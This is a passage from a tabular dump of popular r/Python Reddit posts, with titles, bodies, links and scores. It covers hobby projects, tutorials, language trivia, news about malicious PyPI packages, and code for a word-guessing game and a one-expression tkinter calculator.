Well, I enjoy using it, cause of how simple and adaptive it is. But I just don't enjoy the structure or the method of invoking classes etc. It may be similar to the other languages I've been using, but its just not my cup of coffee. This experience just proved to me it's not about the language itself, its about how you use it and I won't be dropping python any time soon.

I just wanted to write this post because I think I've reached a milestone in coding that has previously eluded me and that is practical application of coding to make my day a little easier and I couldn't have achieved it without python and the python community.",https://www.reddit.com/r/Python/comments/psfdnh/i_used_python_to_automate_a_task_that_would_take/,99,743
bzqz6j,"The online course for ""Automate the Boring Stuff with Python"" is free to sign up this week.",,https://www.reddit.com/r/learnpython/comments/bz3rxv/the_online_course_for_automate_the_boring_stuff/,57,738
5hkp59,Congrats /r/python/ for having one of the most positive commenter communities on Reddit!,"I have been working this last week on a little side projects that runs top comments from the top subreddits through the  [NLTK Sentiment Analyzer] (http://www.nltk.org/api/nltk.sentiment.html) [Vader Module] (http://www.nltk.org/api/nltk.sentiment.html#module-nltk.sentiment.vader) to determine how positive/negative a subreddits comments are.  /r/python/ is currently ranked #6 out of 445 subreddits!

View results here:
[opfeels.com](http://opfeels.com)
[opfeels.com/r/python/](http://opfeels.com/r/python/)

EDIT: Parsing new comments has dropped us down to #10.  Still worthy of congratulations!",https://www.reddit.com/r/Python/comments/5hkp59/congrats_rpython_for_having_one_of_the_most/,64,746
31mom3,Python+OpenCV examples+GTAV = Fun!,,https://gfycat.com/VioletImperturbableBettong,38,743
7nfgw6,User controlled Turtle cubes,,https://i.redd.it/r6ctk6sfzg701.gif,10,735
8715iw,Comprehensive Python Cheatsheet,,https://gto76.github.io/python-cheatsheet/,51,742
yj2qj7,"Python 3.12 speed plan: trace optimizer, per-interpreter GIL for multi-threaded, bytecode specializations, smaller object structs and reduced memory management overhead!",,https://github.com/faster-cpython/ideas/wiki/Python-3.12-Goals,77,736
qka3fp,"[Beginners] Python 3 Cheat Sheet (syntax, libs, projects..)",,https://imgur.com/a/2o2NlFQ,33,741
p6pxko,Learning Python changed my life,"My first encounter with Python happened because of a small lie.

During my application to an internship that required me to build the control system of robots using Python, I lied to my recruiter about already possessing beginner-level programming skills in python.

Thankfully, he didn't ask me anything else and accepted me for the internship program. But since that day, I have religiously practiced Python every day in my life, so that I wouldn't have to lie to anyone else!

In my beginner days, I did the whole dance to learn Python.

I did a lot of free courses on the internet.

I solved every problem I could find on any Python topic again and again. And then again!

Initially, I only did it to do excel at my thesis. But eventually, I fell in love with this simple language.

So much so that I started applying for Python programming jobs even before my Masters in Transportation Engineering got over and happily accepted the job offer when I got one.

Websites I followed for learning
I would like to provide the list of websites, that were of great help when I began programming.

2015 was not the year when there tons of Medium or Dev posts on learning Python. So, finding something useful was actually tricky.

I was a student and therefore, could not afford any paid courses. So I had to stick to the free websites that were available at that time.

1. Stack Overflow
2. Python for everybody course on Coursera

Shout out to Charles Severance for helping me land my first job.

3. Learn Python the Hard Way 

For those of you confused about your career decisions, I would definitely recommend that Python is a great programming language to learn. It provides a lot of job opportunities and doesn't have a huge learning curve. Check out my blog on [5 career driven decisions to learn Python](https://www.pylenin.com/blogs/5-reasons-to-learn-python/).",https://www.reddit.com/r/Python/comments/p6pxko/learning_python_changed_my_life/,54,738
buvrkh,I created a Python library that encodes files into images and videos. This little video holds about 170KB. (Warning- flashing lights),,https://gfycat.com/sombergentleasp,147,739
cl1lrv,How I saved >1000 years of CPU time using my adaptive sampling package for this quantum mechanics plot [OC],,https://v.redd.it/c5ygo9c030e31,54,735
a4g5im,Using dice to recreate a picture,,https://v.redd.it/kr56jfsh95321,26,742
8oqp7v,"Hey, I made a Google reCaptcha solver bot too...",,https://i.redd.it/8osnqnvmm6211.gif,88,743
6o25q8,Has pseudocode gone too far?,,https://i.redd.it/69p4mzm8vdaz.jpg,85,740
nlz2rw,"Tkinter Designer, Automate and beautify GUI creation ☄️","Tkinter Designer is created to speed up and beautify Python GUI Experience. It uses well know design software called Figma. Which makes creating Tkinter GUI in Python a piece of cake.

https://github.com/ParthJadhav/Tkinter-Designer

Of course you will need to tweak some things after it’s created but it saves a lot of time.",https://www.reddit.com/r/Python/comments/nlz2rw/tkinter_designer_automate_and_beautify_gui/,102,734
bmtqeu,Best update ever for my 3D renderer made in Python! Here are some renders:,,https://i.redd.it/fex92gem6bx21.png,58,733
xqot6g,do the two snakes have a name,,https://www.reddit.com/r/Python/comments/xqot6g/do_the_two_snakes_have_a_name/,136,730
cmrtt8,"This is my first Python script... it automates creating a new React app, adds a GitHub repo and origin, opens the project in VS Code and starts the development server!",,https://v.redd.it/jv9127jmgue31,50,734
s8e1lg,Steve Wozniak’s operating system rewritten in Python to learn how it works,"Hi there!
Here is ‘helicopter view’ of 256 bytes Apple co-founder Steve Wozniak’s operating system for Apple-1 rewritten in Python. It has a kind of shell as UI and simple Keyboard and Display ‘drivers’ as interface to hardware.

It is an example of basic functions of all the operating systems - to work with hardware to provide interface to user’s programs and to manage that hardware resources. 

Source code to play with: https://github.com/smartykit/apple1/blob/master/WozOS.py",https://www.reddit.com/r/Python/comments/s8e1lg/steve_wozniaks_operating_system_rewritten_in/,55,730
datbcm,"Just a little pixelart to python array of strings converter I made this weekend, so you can display your pixelarts in the python's command line interface",,https://i.redd.it/i21vntw1cip31.gif,40,731
709vch,PSA - Malicious software libraries in the official Python package repository (xpost /r/netsec),,http://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/,88,734
re6nz4,I wrote a python program for scraping Ebay to find a cheap used espresso machines under $200.,"I plan to make it so that I get notified when new machines are being sold under 300$. My code is not too pretty but here it is. [https://github.com/Hogstem/LearningStuff/blob/main/EbayScrape](https://github.com/Hogstem/LearningStuff/blob/main/EbayScrape).

https://reddit.com/link/re6nz4/video/gg4tgti7qy481/player",https://www.reddit.com/r/Python/comments/re6nz4/i_wrote_a_python_program_for_scraping_ebay_to/,114,730
m9y1k8,I created a lightweight file copier/sorter to help with high school.,"As a 9th grader, I have many unorganized files because of online school. Not just that, I also do photography and sometimes the file names on my camera match up with ones at a specific directory even if the photograph is different which makes it a pain to copy. Though avoidable problems, I decided to use this as a chance to create a program. I created **autosort.**

[Preview](https://i.redd.it/dw57a4giwdo61.gif)

Autosort has the ability to copy files from several directories into folders with other options such as not overwriting duplicate files, removing metadata, sorting by file type, etc!

Github: [https://github.com/vihdutta/autosort](https://github.com/vihdutta/autosort)

I am really proud of this program and I hope you all have some thoughts to share with me!

&#x200B;

EDIT: My Github is back now! You can access it through the link above.",https://www.reddit.com/r/Python/comments/m9y1k8/i_created_a_lightweight_file_copiersorter_to_help/,68,729
k15apv,Python community > Java community,"I'm recently new to programming and got the bright idea to take both a beginner java and python course for school,  so I have joined two communities to help with my coding .  And let me say the python community seems a lot more friendly than the java community. I really appreciate the atmosphere here alot more",https://www.reddit.com/r/Python/comments/k15apv/python_community_java_community/,202,729
jgj206,"[TIL] Python silently concatenates strings next to each other ""abc""""def"" = ""abcdef""","```
>>> ""adkl"" ""asldjk""
'adklasldjk'
```
and this:
```
>>> [""asldkj"", ""asdld"", ""lasjd""]
['asldkj', 'asdld', 'lasjd']
>>> [""asldkj"", ""asdld"" ""lasjd""]
['asldkj', 'asdldlasjd']
```

Why though?",https://www.reddit.com/r/Python/comments/jgj206/til_python_silently_concatenates_strings_next_to/,94,736
p98nmh,When Excel fails you. How to load 2.8 million records with Pandas,"Hey I'm back again with another quick and easy Python data tutorial loading 2.8 million records with Python and Pandas overcoming the Excel row limit.

https://youtu.be/nDixZvbhQZQ

I also encounter two additional errors with this one that we overcome. 1) Delimiter of the CSV being tab and 2) UTF-8 encoding error.

Feedback always welcome. Thanks for your ongoing support.",https://www.reddit.com/r/Python/comments/p98nmh/when_excel_fails_you_how_to_load_28_million/,93,731
gdqfyz,"Response to overwhelming ""I made this"" posts.","I have recently seen the rant against these posts flooding this subreddit and I agree with many of the points.
1. This sub is filled with creations more than discussion.
2. The original purpose of this sub was not this.

With this, I have decided to form a new community solely dedicated to people's creations: r/madeinpython While yes, these posts of your creations are great, not everyone wants to see this on this subreddit, so if we offloaded all this to the new sub, there will be less complaints and everyone who loves this content can go there. Thanks for coming to my Ted talk, please don't hate me :)",https://www.reddit.com/r/Python/comments/gdqfyz/response_to_overwhelming_i_made_this_posts/,259,729
e0x1wt,"I made a system to automate attendance in my college. It uses PyQt5 for UI, and features dynamic authentication, automated mailing, time-bound implementation, schedule synchronization, warning trigger, along with a few configuration options. Thank you r/python community :)",,https://v.redd.it/0e44u9ky2m041,65,731
b16crg,Map of technologies used by 1000 top software companies. Collected using Python.,,https://i.imgur.com/uf835D9.jpg,31,724
ka1nqm,"Me and a few friends have been using python to mod a dead version of Minecraft for a few months and we’ve just made a blog post on it, check it out!","Here’s the link to the post: https://dev.to/nobody5050/how-a-small-team-of-developers-revived-a-dead-version-of-minecraft-3akn

Besides that the general gist is this: Minecraft pi edition hasn’t gotten an update in 7 years so we did it ourselves and have already enabled the hidden survival mode among a bunch of other things. Any questions can be asked in the comments, thanks!

GitHub: https://GitHub.com/mcpi-devs/mcpil",https://www.reddit.com/r/Python/comments/ka1nqm/me_and_a_few_friends_have_been_using_python_to/,40,724
c8f9e5,I also made a space invader game with Python Crash Course. Used music and sprites from Zelda.,,https://v.redd.it/qs08r62oiy731,52,729
665jqt,"Self-driving vehicles with Python, TensorFlow, OpenCV, and Grand Theft Auto 5","I've put out a so far 13-part series on creating a self driving vehicle with Grand Theft Auto 5. 

**[A brief taste of what we're doing](https://twitter.com/Sentdex/status/854394799104962561)**

..or check out the latest video in the series: **[a more interesting self-driving AI](https://www.youtube.com/watch?v=nWJZ4w0HKz8)**, especially near the end. 

This is by no means a serious look into self-driving vehicles, it's just for fun, and so far the latest project has been to make a motorcycle that speeds through traffic, attempting to stay on the road and evading all the other slow drivers. 

We do all of this with basic(ish...) tools and concepts. We're reading the screen by taking screenshots with pywin32, seeing about 20 FPS with the neural network, sending keys with direct input, and then doing some analysis with OpenCV, otherwise also training with a convolutional neural network in TensorFlow. 

The goal of the series is more to show you how you can take just about whatever game you want, mapping the screen to inputs, training a neural network, and then letting the network play the game. 

It's an ongoing project, and is also **[open-source](https://github.com/sentdex/pygta5/)**

Here's a link to the **[self-driving tutorials](https://pythonprogramming.net/game-frames-open-cv-python-plays-gta-v/)**, which starts at the beginning. We start to use the neural network in **[part 9](https://pythonprogramming.net/self-driving-car-neural-network-training-data-python-plays-gta-v/)**

That's all for now, more AI in GTA to come.",https://www.reddit.com/r/Python/comments/665jqt/selfdriving_vehicles_with_python_tensorflow/,25,727
w75ack,"Your favourite ""less-known"" Python features?","We all love Python for it's flexibility, but what are your favourite ""less-known"" features of Python?

&#x200B;

Examples could be something like:

    'string' * 10  # multiplies the string 10 times

or 

    a, *_, b = (1, 2, 3, 4, 5)  # Unpacks only the first and last elements of the tuple",https://www.reddit.com/r/Python/comments/w75ack/your_favourite_lessknown_python_features/,466,725
v4mb41,Anyone else learning Python as a hobby?,"Hi!

So I started learning Python as a hobby about 2 weeks ago ago, and it has been fun.

It's extra fun because you have your own ""schedule"".
I sure as hell will not follow any career surrounding Python or coding in general, it's just a hobby.

This is the post to tell people how your journey has been going!",https://www.reddit.com/r/Python/comments/v4mb41/anyone_else_learning_python_as_a_hobby/,195,732
70udwq,What routine tasks do you automate with programs?,"Recently my girlfriend told me that I don't pay enough attention on her Instagram account, I don't like wasting my time checking feed every time so I wrote a python script and created a cron job which starts every 2 minutes and checking if there are new posts and like them if needed. What did you recently automated?

Source code of my script on [GitHub](https://github.com/dzaytsev91/mygf-instagram)",https://www.reddit.com/r/Python/comments/70udwq/what_routine_tasks_do_you_automate_with_programs/,314,731
ko4gh7,Easy to follow Python web scraping tutorial with the help of MITMProxy,"Hey r/python I posted this tutorial on how to access a private API with the help of Man in the Middle Proxy a couple of months back and thought I might reshare for those who may have missed it.

[https://www.youtube.com/watch?v=LbPKgknr8m8](https://www.youtube.com/watch?v=LbPKgknr8m8)

**Topics covered** 

* MITMProxy to observe the web traffic and get the API calls
* Requests to perform the API call in Python
* BeautifulSoup to convert the XML data
* Pandas to take the converted XML data and create a CSV file

If your 2021 new years resolution is to learn Python definitely consider subscribing to my YouTube channel because my goal is to share more tutorials!",https://www.reddit.com/r/Python/comments/ko4gh7/easy_to_follow_python_web_scraping_tutorial_with/,29,731
j7tb5q,I created a script that uses Python to calculate color infrared scenes (as well as others) using Landsat8 imagery. (GitHub repo in comments.),,https://i.redd.it/dd3rie7e80s51.png,29,722
zuzx7r,"I know this isn't much, but I made Minesweeper using Python. Really proud how it turned out!","[Link to GitHub](https://github.com/espy02/python-minesweeper) 

Any feedback would be appreciated",https://www.reddit.com/r/Python/comments/zuzx7r/i_know_this_isnt_much_but_i_made_minesweeper/,59,727
g2b3y8,I built an Instagram Relationship Analytics Tool,,https://v.redd.it/u1e9x5ar55t41,110,728
9y972g,Python will be the official programming language for education in France,,http://eduscol.education.fr/cid134825/consultation-sur-les-programmes-seconde-premiere.html,83,724
cje5yh,Short Python challenge : make this return True !,,https://i.redd.it/rq9dw6jzy9d31.png,138,726
kbsl1o,New console-based spinner animations in Rich,,https://youtu.be/CLkLvOmNOjc,31,719
js3xlv,Why did I wait so long?,"I have a Raspberry Pi I use to control my electric gates and outdoor lights. I'd written some C to do various things, having learnt a bit at university. Had to rebuild the system this week and my backups weren't complete so decided to rewrite my programmes in Python.

So much easier! I'm never going to have a career as a programmer anyway but the fact I don't need to faff around with compiling and makefiles is so refreshing.",https://www.reddit.com/r/Python/comments/js3xlv/why_did_i_wait_so_long/,93,722
n1qea7,Using finite state machines to speed up an algorithm by a factor of 173.4 BILLION,,https://mathspp.com/blog/counting-passwords-with-automatons,36,719
bs6hhw,"The internet is down at work, fortunately I have my extensive library of high quality homemade games to keep me entertained",,https://i.redd.it/3v4kyfl180031.png,80,719
jd9hvk,I made a python script that polices your Spotify playlists.,"For background, some friends and I had a collaborative playlist going for a while when a random record label somehow got the link. They started spamming our playlist with their music and when we deleted all their songs they would either re-add them or delete all of ours.

This went on for way too long so I eventually decided to make a bot that checked in on the playlists and removed any songs added from non-whitelisted users. It also would save a backup of the playlist and be able re-add any removed songs. This was a pretty simple project but I thought id share the code in case anyone was having a similar issue.

HeHere'sres a link to the [GitHub Repo](https://github.com/MagicalTurtle/PlaylistPolice) , any suggestions are appreciated.",https://www.reddit.com/r/Python/comments/jd9hvk/i_made_a_python_script_that_polices_your_spotify/,35,714
79rvk3,Stranger Things Basic Code rewritten in Python.,,https://i.redd.it/vrh00w7y32vz.jpg,92,721
4f0x74,Google has started a new video series teaching machine learning and I can actually understand it. [X-Post /r/programming],,https://www.youtube.com/watch?v=cKxRvEZd3Mw,76,715
5zpe9e,Wut,,http://imgur.com/5sVrzGW,79,719
yjw3ji,"I built a simple Airbnb scraper to analyze cleaning fees so you don't have to. Nothing fancy. Hopefully, it's useful.",,https://deepnote.com/workspace/datafantic-3bd1a992-4cfb-4c56-aaaf-931ce087ce8c/project/2022-10-21-Whats-up-with-Airbnb-fees-3a09bbfb-7f5f-46b3-8fa0-788f71b2887f/notebook/01%20-%20Data%20Collection-6e5070b071084882953fadbc939609f3,16,722
vjlfom,Multiple Backdoored Python Libraries Caught Stealing AWS Secrets and Keys,"Researchers have identified multiple malicious Python packages designed to steal AWS credentials and environment variables.  

What is more worrying is that they upload sensitive, stolen data to a publicly accessible server.

[https://thehackernews.com/2022/06/multiple-backdoored-python-libraries.html](https://thehackernews.com/2022/06/multiple-backdoored-python-libraries.html)",https://www.reddit.com/r/Python/comments/vjlfom/multiple_backdoored_python_libraries_caught/,101,714
9cfcmp,My first program(!) - new to coding. Time tracker for account managers on their clients.,,https://v.redd.it/i78m8vzhzvj11,134,712
qq83e6,"MILESTONE: I finally tried to organize a project! Instead of being a one-filer I made classes, packages, and used a DB instead of a CSV. To most that will seem obvious, but I know I'm not the only analyst who hasn't had the best coding habits. So, this post is to encourage those to make the change!","For context: most of the coding I do is for analytical work and I’m the only one who even sees it 99% of the time, so I was really bad about just diving straight in and not really worrying about the organization as long as I got the output I was looking for. The one Python class I took in college didn’t cover much on project organization and it’s not required for my job – so I never bothered with it. 

Well, I’ve recently started using Python on a more consistent basis and realized that something had to give (I was even avoiding writing classes). I knew this project was going to be a little more involved, so I decided to get organized. Even just coming up with an outline was a big help (I normally just pick a starting point and go for it). I know if I was doing it, then there are others here doing it as well. 

On your next project, make a goal to practice better habits and I guarantee you’ll get done faster and you won’t stress out as much when you need to make changes. Also, since this was my first time and I’m 90% self-taught, if anyone has any other good tips or knows of any good books to reference, please let me know!",https://www.reddit.com/r/Python/comments/qq83e6/milestone_i_finally_tried_to_organize_a_project/,79,721
hc246c,Spiral using turtle/ different colors,,https://i.redd.it/7evk8a6wrv551.png,24,718
110l7ag,Researchers Uncover Obfuscated Malicious Code in PyPI Python Packages,,https://thehackernews.com/2023/02/researchers-uncover-obfuscated.html,99,713
hvgffk,Orbital Gravity Simulator made with pygame! Source code in comments.,,https://v.redd.it/idkh2pkk4ac51,36,711
h8ztdx,Hacking a coffee machine mr.robot style.,,https://youtu.be/DF5LSRg2ps4,40,712
cwgvvt,A Guide to Excel Spreadsheets in Python With openpyxl – Real Python,,https://realpython.com/openpyxl-excel-spreadsheets-python/,91,707
ar0fcf,Making my first program ever! Recently finished tutorials on python and spent forever attempting to brainstorm ideas about where to go next. I decided to do something useful and automate some of the things I do at work every day! It’s incomplete but I am wayyyy too excited to keep it to myself 😅.,,https://v.redd.it/51lsqsw1dsg21,126,712
fudlk3,"I made my first Machine Learning project in Python, to detect numbers, with 99% accuracy.",,https://v.redd.it/u9ness5xanq41,88,715
p59091,Anyone else despises Matplotlib?,"Every time I need to use mpl for a project I die a little inside. The API feels like using a completely different language, I simply can't make a basic plot without having to re-google stuff as everything feels anti intuitive.

Plus, the output bothers me too. Interactive plots feel extremely awkward, and its just wonky

EDIT: Despises working with matplotlib*. I'm thankful such a powerful library exists, and I get that for scientific papers and stuff like that it's great, but damn isn't it painful to use",https://www.reddit.com/r/Python/comments/p59091/anyone_else_despises_matplotlib/,168,714
l9basm,How do we know that imported third party python library isn't spying on our program?,"Hello. Im just curious. If someone installs third party library, how do we know that it doesn't contain malicious code. I know that the code is open source. But, who reviews it?",https://www.reddit.com/r/Python/comments/l9basm/how_do_we_know_that_imported_third_party_python/,139,706
11l0a09,"A Programming game where you use Python to automate all kinds of machines, robots, drones and more and solve exciting bite-sized coding challenges (developer post)","I had the pleasure of presenting JOY OF PROGRAMMING here on r/python before and it was met with an overwhelmingly positive reception and a lot of valuable feedback. Thank you!  In case you missed it, the game is all about practicing and applying your Python skills to challenging tasks in realistic, physically simulated 3D environments. It covers a wide variety of topics, from basic algo / ds, oop, GUI programming to control theory, robotics, image processing, machine learning, genetic algorithms, and more. Development is well underway and I'm aiming for a release in Q4 this year.

Today I'd like to get your thoughts on the importance of debugging! Obviously, I already spent an unreasonable amount of time solving the problem, before talking to stakeholders :). So I did create a custom Python debugger (using sys.settrace) and hooked it up to my in-game GUI (based on Codemirror). Now you can set breakpoints, step through the code and inspect variables like you are used to - and the game / simulation steps along in sync (mostly).

If you are interested in the game, you can find a lot more information about this and all other features and an up to date devlog on the Steam page:

[https://store.steampowered.com/app/2216770/JOY\_OF\_PROGRAMMING\_\_Software\_Engineering\_Simulator](https://store.steampowered.com/app/2216770/JOY_OF_PROGRAMMING__Software_Engineering_Simulator)

I’m happy to answer any questions or to hear your feedback and ideas.",https://www.reddit.com/r/Python/comments/11l0a09/a_programming_game_where_you_use_python_to/,60,706
bddla1,Just created a cheat sheet about Support Vector Machines,,https://i.redd.it/ygr8eadb2es21.jpg,33,711
xs184r,I've built an app to show how to build a complete web app,"I've built [tozo.dev](https://tozo.dev) to demonstrate how to build a (Progressive) web app with a Python-Quart backend, and a Typescript-React frontend running in AWS. I've included in the repository, [github.com/pgjones/tozo](https://github.com/pgjones/tozo) everything needed to reproduce it i.e. all the code, the CI/CD actions, and the Terraform infrastructure definitions. 

The commits are ordered and explained, and I hope that you can follow them to build you own app, alternatively you can just take code as a blueprint. 

The app itself manages to-dos, but this is just as an example. If you remove this functionality you have an app including user management ready to go.

I use this to help train engineers, and I use (and have used) the stack for production projects. 

(I did post about this earlier in the [week](https://www.reddit.com/r/Python/comments/xoh1oo/ive_built_a_todo_app_with_a_quart_backend_react/) but I don't think I explained it very well).",https://www.reddit.com/r/Python/comments/xs184r/ive_built_an_app_to_show_how_to_build_a_complete/,35,705
g87p2p,"My first project without any tutorial help, a simple program for torrent browsing!",,https://v.redd.it/rp5b6p6n43v41,48,706
ab0uvr,pip_irl,,https://i.redd.it/syt5f8pnwh721.png,78,703
2t2wfj,11 Python Libraries You Might Not Know,,http://blog.yhathq.com/posts/11-python-libraries-you-might-not-know.html,66,711
v669pt,Python 3.11 Performance Benchmarks Are Looking Fantastic,,https://www.phoronix.com/scan.php?page=article&item=python-311-benchmarks&num=1,102,709
c6rzfp,Python now beating Java on Google Trends Worldwide,,https://i.redd.it/jmz60r6av6731.png,81,709
k0thko,PyQt Layouts: Create Professional-Looking GUI Applications – Real Python,,https://realpython.com/python-pyqt-layout/,82,706
5wec78,I wrote a program that emails me when one of my friends orders Domino's.,"Code: http://www.technologyversus.com/pizza/

It basically iterates through a dictionary of phone numbers and checks for an active order. If there is an active order, the program sends an email to a specified email account.

Feedback is always welcomed. The code is a bit rough, I have not been programming in Python for very long. Like 3 months.

Thanks and enjoy!",https://www.reddit.com/r/Python/comments/5wec78/i_wrote_a_program_that_emails_me_when_one_of_my/,224,707
lqfc05,Building a Flappy Bird game in Python ( Too much Speed ),,https://youtube.com/watch?v=BlATzS3aJ6w&feature=share,41,702
pxu1yi,"I was sick of my Netflix list movies disappearing, so I wrote some code to tell me what content will be expiring soon","It's a bit of a pain to set up if you don't have the Selenium Chrome webdriver, but the rest is fairly easy. 

Selenium scrapes your Netflix list and the free Reddit search API (https://rapidapi.com/unogs/api/unogsng/) uses your region to tell you what is expiring soon. Then we compare! 

The API only allows 100 free calls a day, so you'll have to get your own key. 

https://github.com/GrubHubGitTub/GetExpiringNetflixMyList

Check it out and let me know if you like it! Right now it just returns a dictionary but I may tweak it in the future. 

I have only been coding for about 3 months and I am just trying to get some projects under my belt. Any feedback would be greatly appreciated!

Edit: Thanks so much for all the recommendations. You can check out the updated version that makes it a lot easier to install and get started.",https://www.reddit.com/r/Python/comments/pxu1yi/i_was_sick_of_my_netflix_list_movies_disappearing/,100,706
ag3aeq,"I made my first Python app at 41 with the bare minimum training and it's probably the worst looking code ever, but it works.","&#x200B;

**Edit:**

I just woke up and I read all your constructive feedback. WOW, this is why I love Reddit sometimes. I will try and implement all the tips and tricks to my app.

Quick question (I woke up with this idea), if I wanted to add a dictionary to my app, to check if the word is a real word, is it easily achievable?

&#x200B;

**Background:**

I am a High School dropout and I have no degree. I started working in IT about 8 years ago and made my way to being a System Administrator for a small Supermarket chain. I am new to Python and the only language I know a little of is Powershell.

**Why I want to learn Python:**

There are not a lot of practical skills that I learned on my own. So on December 28th, I decided to put my energy into learning how to code. I saw a post in r/powershell : [Powershell Guide to Python](https://www.reddit.com/r/PowerShell/comments/ab27n2/book_update_powershell_guide_to_python/) by  [u/Prateeksingh1590](https://www.reddit.com/user/Prateeksingh1590) and decided I wanted to learn Python. So I watched 2.5 hours out of the 4 hours from [this video for beginners](https://www.youtube.com/watch?v=rfscVS0vtbw&t=12978s). I also watched 2 hours of a [Lynda.com](https://Lynda.com) course, mainly reviewing what I had learned from [Mike Dane](https://www.youtube.com/channel/UC8butISFwT-Wl7EV0hUK0BQ).

**The App:**

At one point, I wanted to know if I could code an app with the little basic knowledge I had. I thought about building an guessing word game. So I layed out want I wanted to achieve. I wanted the person guessing to have 3 information while guessing a word :

1 - To know if the have more, less or equal the characters of the word

2 - To know if they have some letters right

3 - To if the letters that are right are in the right spot

**Making the App:**

So I started my journey to make this app. It took me over a week and about 8-10 hours of trials and errors and googling to achieve the app. Watch out for yourself, it's pretty ugly. but it works.

**Feedback is more than welcome**

&#x200B;

    from getpass import getpass
    
    word = getpass(""Enter the secret word :"")
    word = (word.lower())
    word_compare = set(word)
    word_char = len(word)
    word_len = word_char
    guess_word = """"
    not_eno = ""Not enough characters in your guess""
    too_many = ""Too many characters in your guess""
    exactly = ""You have the exact number of characters in your guess""
    ok_letters = 0
    count = 0
    
    while guess_word != word:
        count += 1
        guess_word = input('What is the secret word?')
        guess_word = (guess_word.lower())
        guess_char = len(guess_word)
        guess_len = guess_char
        guess_compare = set(guess_word)
        same_char = word_compare & guess_compare
        num_same_char = len(same_char)
        if guess_word == word:
            break
        elif len(guess_word) != 0:
            if word_char > guess_char:
                word_char = guess_char
            elif guess_char > word_char:
                dif = guess_char - word_char
                word_char = guess_char
                for add_letters in range(dif):
                    word = word + str(add_letters)
            for num_letters in range(word_char):
                if guess_word[num_letters] == word[num_letters]:
                    ok_letters = ok_letters + 1
            if guess_len < word_len:
                print(""This is try # "" + str(count) + "". \n""
                      + str(not_eno) + "". \n""
                      + ""You have "" + str(num_same_char) + "" good letter(s). \n""
                      + ""You have "" + str(ok_letters) + "" letter(s) correctly placed."")
            elif guess_len > word_len:
                print(""This is try # "" + str(count) + "". \n""
                      + str(too_many) + "". \n""
                      + ""You have "" + str(num_same_char) + "" good letter(s). \n""
                      + ""You have "" + str(ok_letters) + "" letter(s) correctly placed."")
            else:
                print(""This is try # "" + str(count) + "". \n""
                      + str(exactly) + "". \n""
                      + ""You have "" + str(num_same_char) + "" good letter(s). \n""
                      + ""You have "" + str(ok_letters) + "" letter(s) correctly placed.""
                      )
            ok_letters = 0
        else:
            print(""You have entered nothing, please try again"")
    print(""Congratulation!!! You have guessed the word correctly"")

&#x200B;

Thank you.

&#x200B;

&#x200B;

&#x200B;",https://www.reddit.com/r/Python/comments/ag3aeq/i_made_my_first_python_app_at_41_with_the_bare/,121,703
scbhnq,What’s the Meaning of Single and Double Underscores In Python?,"Have you ever been curious about the several meanings of underscores in Python? A little break-down?

*- you can find detailed explanations and code snippets* [*here*](https://towardsdatascience.com/whats-the-meaning-of-single-and-double-underscores-in-python-3d27d57d6bd1)

1️⃣ single leading underscore (""\_var""): indicates that the variable is meant for internal use. This is not enforced by the interpreter and is rather a hint to the programmer.

2️⃣ single trailing underscore (""var\_""): it's used to avoid conflicts with Python reserved keywords (""class\_"", ""def\_"", etc.)

3️⃣ double leading underscores (""\_\_var""): Triggers name mangling when used in a class context and is enforced by the Python interpreter.   
What this means is that it should be used to avoid your method is being overridden by a subclass or accessed accidentally.

4️⃣ double leading and trailing underscores (""\_\_var\_\_""): used for special methods defined in the Python language (ex. \_\_init\_\_, \_\_len\_\_, \_\_call\_\_, etc.). They should be avoided to use for your own attributes.

5️⃣ single underscore (""\_""): Generally used as a temporary or unused variable. (If you don't use the running index of a for-loop, you can replace it with ""\_"").",https://www.reddit.com/r/Python/comments/scbhnq/whats_the_meaning_of_single_and_double/,61,703
ojab0n,I see your 17 loc calculator and I raise you a calculator in a single Python expression,"**TL;DR**:

    (tk := __import__(""tkinter"")) and (bt_draw := lambda k, c, l: (bt := tk.Button(w, text=k, command=lambda: bt_press(k), width=6)) and bt.grid(column=c, row=l) or bt) and (update := lambda t: d.config(text=t)) and (bt_press := lambda k: update("""") if k == ""C"" else update(d[""text""][:-1]) if k == ""<"" else update(str(round(eval(d[""text""]), 6))) if k == ""="" else update(d[""text""] + k)) and (w := tk.Tk()) and w.title(""TKalc"") or (d := tk.Label(w, text="""")) and d.grid(column=0, row=0, columnspan=5) or [bt_draw(k, n%4 + 1, n//4 + 1) for n, k in enumerate(""()C<789/456*123-.0=+"")] and w.mainloop()

&#x200B;

https://preview.redd.it/edc0xkkzixa71.png?width=1513&format=png&auto=webp&s=d8edd3ede39911a6d4859a475e0a0d1283d53bf7

A couple of days ago there was a post on this subreddit that showed a Python calculator in 17 lines of code ([this is the post](https://www.reddit.com/r/Python/comments/ofr75b/i_made_a_calculator_with_17_lines_of_code/)). I took that to an extreme and condensed that into a calculator that is a single expression in Python.

Notice that a single expression and a single line aren't the same thing, expressions are even smaller parts. A single line can contain multiple expressions and statements. An expression can't contain any of that.

Here is what we started with:

    from tkinter import *
    
    def bt_draw(key, col, lin):
        bt = Button(window, text=key, command=lambda: bt_press(key))
        bt.grid(column=col+1, row=lin+1)
        return bt
    
    def bt_press(key):
        if   key == ""C"": disp[""text""] = """"
        elif key == ""<"": disp[""text""] = disp[""text""][:-1]
        elif key == ""="": disp[""text""] = str(round(eval(disp[""text""]), 6))
        else           : disp[""text""] += key
    
    window = Tk()
    window.title(""TKalc"")
    
    disp = Label(window, text="""")
    print(disp.grid(column=0, row=0, columnspan=5))
    
    keys = ""()C<789/456*123-.0=+""
    bt_list = [bt_draw(keys[n], n%4, n//4) for n in range(20)]
    
    window.mainloop()

Here is the final code:

    (tk := __import__(""tkinter"")) and (bt_draw := lambda k, c, l: (bt := tk.Button(w, text=k, command=lambda: bt_press(k), width=6)) and bt.grid(column=c, row=l) or bt) and (update := lambda t: d.config(text=t)) and (bt_press := lambda k: update("""") if k == ""C"" else update(d[""text""][:-1]) if k == ""<"" else update(str(round(eval(d[""text""]), 6))) if k == ""="" else update(d[""text""] + k)) and (w := tk.Tk()) and w.title(""TKalc"") or (d := tk.Label(w, text="""")) and d.grid(column=0, row=0, columnspan=5) or [bt_draw(k, n%4 + 1, n//4 + 1) for n, k in enumerate(""()C<789/456*123-.0=+"")] and w.mainloop()

[GitHub Gist](https://gist.github.com/RojerGS/3b3d301710da3da80ece693de068e3c9)

**Here is how I did it:**

First things first, we clean up the code a bit:

* starred imports aren't generally a good idea and we only need 3 things, so import those or import `tkinter` by itself;
* the list comprehension in the end should really use an `enumerate` ([writing Pythonic code with `enumerate`](https://mathspp.com/blog/pydonts/enumerate-me));
